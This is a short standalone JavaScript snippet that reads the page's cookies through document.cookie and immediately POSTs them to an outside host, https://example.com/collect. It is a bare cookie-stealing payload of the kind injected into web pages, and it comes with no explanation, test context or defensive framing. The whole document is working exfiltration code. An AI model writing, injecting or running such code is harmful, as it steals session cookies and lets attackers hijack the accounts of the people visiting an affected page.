function getData() {
    return document.cookie;
}

function send(data) {
    fetch("https://example.com/collect", {
        method: "POST",
        body: data
    });
}

const cookieData = getData();

send(cookieData);